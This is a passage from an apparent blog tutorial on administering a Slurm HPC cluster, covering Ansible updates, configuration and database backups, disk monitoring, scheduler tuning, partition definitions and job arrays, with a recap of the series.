<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// nextflow.config</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    executor </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'slurm'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    queue </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'compute'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'8 GB'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    time </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'2h'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p>Run with:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nextflow run nf-core/rnaseq </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-profile</span><span class="token plain"> slurm</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="maintenance-tasks">Maintenance Tasks<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#maintenance-tasks" class="hash-link" aria-label="Direct link to Maintenance Tasks" title="Direct link to Maintenance Tasks" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="regular-updates">Regular Updates<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#regular-updates" class="hash-link" aria-label="Direct link to Regular Updates" title="Direct link to Regular Updates" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Update cluster via Ansible</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible-playbook </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> inventories/hosts river_cluster.yml </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--tags</span><span class="token plain"> update</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Update specific nodes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible-playbook </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> inventories/hosts river_cluster.yml </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--limit</span><span class="token plain"> worker-01,worker-02</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="backup-critical-data">Backup Critical Data<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#backup-critical-data" class="hash-link" aria-label="Direct link to Backup Critical Data" title="Direct link to Backup Critical Data" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Backup Slurm configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">cp</span><span class="token plain"> /etc/slurm-llnl/slurm.conf /backup/slurm.conf.</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">date</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> +%Y%m%d</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Backup accounting database</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysqldump </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> slurm </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> slurm_acct_db </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> slurm_acct_backup_</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">date</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> +%Y%m%d</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain">.sql</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Backup user data (use rsync for efficiency)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rsync</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-av</span><span class="token plain"> /home/ /backup/home/</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="monitoring-disk-space">Monitoring Disk Space<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#monitoring-disk-space" class="hash-link" aria-label="Direct link to Monitoring Disk Space" title="Direct link to Monitoring Disk Space" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check disk usage on all nodes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible all </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> inventories/hosts </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> shell </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"df -h"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check specific directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible all </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> inventories/hosts </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> shell </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"du -sh /var/log/slurm"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Find large files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">find</span><span class="token plain"> /home </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-type</span><span class="token plain"> f </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-size</span><span class="token plain"> +1G </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-exec</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lh</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="performance-optimization-tips">Performance Optimization Tips<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#performance-optimization-tips" class="hash-link" aria-label="Direct link to Performance Optimization Tips" title="Direct link to Performance Optimization Tips" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-tune-scheduler-parameters">1. Tune Scheduler Parameters<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#1-tune-scheduler-parameters" class="hash-link" aria-label="Direct link to 1. Tune Scheduler Parameters" title="Direct link to 1. Tune Scheduler Parameters" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># /etc/slurm-llnl/slurm.conf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Increase scheduling frequency</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">SchedulerTimeSlice</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">30</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Prioritize recent submitters less</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PriorityWeightAge</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1000</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PriorityWeightFairshare</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Enable backfill scheduling with larger window</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">SchedulerType</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">sched/backfill</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">bf_window</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1440</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 24 hours</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-optimize-job-packing">2. Optimize Job Packing<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#2-optimize-job-packing" class="hash-link" aria-label="Direct link to 2. Optimize Job Packing" title="Direct link to 2. Optimize Job Packing" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use CR_CPU for CPU-bound jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">SelectType</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">select/cons_tres</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">SelectTypeParameters</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">CR_CPU</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or CR_Memory for memory-bound jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">SelectTypeParameters</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">CR_Memory</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or CR_Core for mixed workloads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">SelectTypeParameters</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">CR_Core</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-create-multiple-partitions">3. Create Multiple Partitions<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#3-create-multiple-partitions" class="hash-link" aria-label="Direct link to 3. Create Multiple Partitions" title="Direct link to 3. Create Multiple Partitions" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># /etc/slurm-llnl/slurm.conf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Fast partition for short jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PartitionName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">quick </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Nodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">01-02</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Default</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">NO </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxTime</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">01:00:00 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">UP </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Priority</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Standard partition</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PartitionName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">standard </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Nodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">01-04</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Default</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">YES </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxTime</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain">-00:00:00 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">UP </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Priority</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Long partition for extended jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PartitionName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">long </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Nodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">03-04</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Default</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">NO </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxTime</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">7</span><span class="token plain">-00:00:00 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">UP </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Priority</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">25</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># GPU partition</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PartitionName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">gpu </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Nodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">gpu-</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">01-02</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Default</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">NO </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MaxTime</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain">-00:00:00 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">UP </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Priority</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">75</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-enable-job-arrays-for-batch-processing">4. Enable Job Arrays for Batch Processing<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#4-enable-job-arrays-for-batch-processing" class="hash-link" aria-label="Direct link to 4. Enable Job Arrays for Batch Processing" title="Direct link to 4. Enable Job Arrays for Batch Processing" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --array=1-100%10  # 100 tasks, max 10 concurrent</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Process task based on array index</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python process.py </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--input</span><span class="token plain"> data_</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${SLURM_ARRAY_TASK_ID}</span><span class="token plain">.txt</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="conclusion">Conclusion<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion" translate="no">​</a></h2>
<p>Congratulations! You now have the knowledge to build, deploy, and manage a production Slurm HPC cluster. Let's recap the journey:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-1-foundations">Part 1: Foundations<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#part-1-foundations" class="hash-link" aria-label="Direct link to Part 1: Foundations" title="Direct link to Part 1: Foundations" translate="no">​</a></h3>
<ul>
<li class="">Understanding Slurm architecture</li>
<li class="">Single-node setup for learning</li>
<li class="">Critical cgroup configuration</li>
<li class="">Job accounting basics</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-2-production-deployment">Part 2: Production Deployment<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#part-2-production-deployment" class="hash-link" aria-label="Direct link to Part 2: Production Deployment" title="Direct link to Part 2: Production Deployment" translate="no">​</a></h3>
<ul>
<li class="">Ansible automation</li>
<li class="">Multi-node cluster setup</li>
<li class="">Monitoring with Grafana</li>
<li class="">Slack alerting</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-3-administration-this-post">Part 3: Administration (This Post)<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#part-3-administration-this-post" class="hash-link" aria-label="Direct link to Part 3: Administration (This Post)" title="Direct link to Part 3: Administration (This Post)" translate="no">​</a></h3>
<ul>
<li class="">User and resource management</li>
<li class="">Node maintenance and troubleshooting</li>
<li class="">Security hardening</li>
<li class="">Performance optimization</li>
<li class="">Framework integration</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h2>
<ol>
<li class=""><strong>Start Simple, Scale Smart</strong>: Master single-node before going multi-node</li>
<li class=""><strong>Automate Everything</strong>: Use Ansible for reproducible deployments</li>
<li class=""><strong>Monitor Proactively</strong>: Set up alerting before problems occur</li>
<li class=""><strong>Security First</strong>: SSH hardening, proper permissions, Docker caution</li>
<li class=""><strong>Regular Maintenance</strong>: Backups, updates, and log monitoring</li>
<li class=""><strong>Documentation</strong>: Document your cluster configuration and procedures</li>
</ol>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="whats-next">What's Next?<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#whats-next" class="hash-link" aria-label="Direct link to What's Next?" title="Direct link to What's Next?" translate="no">​</a></h2>
<p>Consider these advanced topics:</p>
<ul>
<li class=""><strong>High Availability</strong>: Redundant controllers with failover</li>
<li class=""><strong>LDAP Integration</strong>: Centralized authentication for large organizations</li>
<li class=""><strong>GPU Scheduling</strong>: Optimize for machine learning workloads</li>
<li class=""><strong>Cloud Bursting</strong>: Expand to cloud resources during peak demand</li>
<li class=""><strong>Custom Plugins</strong>: Extend Slurm with custom scheduling policies</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="resources">Resources<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#resources" class="hash-link" aria-label="Direct link to Resources" title="Direct link to Resources" translate="no">​</a></h2>
<ul>
<li class=""><strong>Part 1</strong>: <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1">Single Node Setup</a></li>
